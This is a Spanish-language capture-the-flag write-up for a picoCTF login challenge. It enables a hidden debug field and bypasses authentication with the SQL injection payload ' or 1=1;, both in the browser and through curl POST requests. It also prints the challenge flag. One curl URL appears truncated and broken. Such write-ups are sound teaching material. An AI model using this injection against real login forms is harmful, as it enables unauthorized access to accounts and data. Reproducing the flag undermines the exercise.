## Descripción 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Datos de Acceso al Nivel
user: carlosof
password:

## Solución 1
- Ingresamos al link de la pagina y nos dirigimos a la parte del login del admin.
- Inspeccionamos la pagina web y  en el `<input type="hidden" name="debug" value="0">` cambiamos el valor a 1.
- Al tratar de ingresar con una contraseña cualquiera, nos regresa lo siguiente:
```
username: admin
password: 
SQL query: SELECT * FROM users WHERE name='admin' AND password=''

# Login failed. (Ahora sabemos que es vulnerable a un ataque de inyeccion SQL)
```
- Ingresamos admin en el username y de password utilizamos `'or 1 = 1;`
```
username: admin 
password: 'or 1 = 1;
SQL query: SELECT * FROM users WHERE name='admin ' AND password=''or 1 = 1;'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
```
## Solución 2
```bash
	carlosof-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=password&debug=1"
<pre>username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
</pre><h1>Login failed.</h1>carlosof-picoctf@webshell:~$ curl -s https://jupiter.challenges.pin.php -d "username=admin&password=' or 1=1;&debug=1"
<pre>username: admin
password: ' or 1=1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>carlosof-picoctf@webshell:~$ 

```

## Notas Adicionales
- Una inyección SQL es una técnica de ataque que permite a un atacante insertar o manipular consultas SQL a través de entradas no validadas en una aplicación. Esto puede resultar en el acceso no autorizado a bases de datos, divulgación de información sensible, modificación o eliminación de datos.

- `curl`, una herramienta de línea de comandos para hacer solicitudes HTTP.
- `curl -s`: Llama a `curl` en modo silencioso, evitando que muestre el progreso de la descarga.

## Referencias 
https://play.picoctf.org/practice/challenge/80
https://latam.kaspersky.com/resource-center/definitions/sql-injection?srsltid=AfmBOootRM9cCI88fJV0m7V-OOrzjB2Z5qBP-J1De9j-ZjM5AXJLUxk0